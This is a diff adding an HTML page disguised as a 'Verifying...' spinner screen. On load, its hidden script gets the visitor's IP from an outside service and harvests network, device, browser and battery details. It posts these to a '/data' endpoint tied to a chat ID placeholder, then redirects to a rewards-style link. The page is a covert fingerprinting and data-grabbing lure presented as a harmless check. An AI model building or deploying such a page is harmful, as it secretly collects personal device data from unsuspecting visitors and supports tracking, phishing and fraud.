@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff;
+        }
+
+        .spinner-container {
+            text-align: center;
+        }
+
+        .spinner {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <h1>Verifying...</h1>
+    </div>
+
+    <script>
+        const chatId = 'YOUR_CHAT_ID';
+
+        function gatherDeviceData(ip) {
+            let td = '';
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const networkInfoKeys = ["downlink", "effectiveType", "rtt", "type"];
+            const deviceInfoKeys = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
+
+            networkInfoKeys.forEach(key => {
+                if (connection && connection[key]) {
+                    td += `<b>${key}</b>: <code>${connection[key]}</code><br>`;
+                }
+            });
+
+            td += "<br><b>📱 Device Information</b><br>";
+            deviceInfoKeys.forEach(key => {
+                if (navigator[key] !== undefined) {
+                    td += `<b>${key}</b>: <code>${navigator[key]}</code><br>`;
+                }
+            });
+
+            navigator.getBattery().then(battery => {
+                const batteryLevel = Math.round(battery.level * 100);
+
+                fetch('/data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        networkInfo: td,
+                        batteryLevel: batteryLevel,
+                        ip: ip
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "https://mrewards.app/?uid=UkEEGH1sBw";
+                    } else {
+                        window.location.href = "https://mrewards.app/?uid=UkEEGH1sBw&error=true";
+                    }
+                });
+            });
+        }
+
+        function getClientIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    gatherDeviceData(data.ip);
+                })
+                .catch(() => {
+                    window.location.href = "https://mrewards.app/?uid=UkEEGH1sBw&error=true";
+                });
+        }
+
+        window.onload = function() {
+            getClientIP();
+        };
+    </script>
+</body>
+</html>
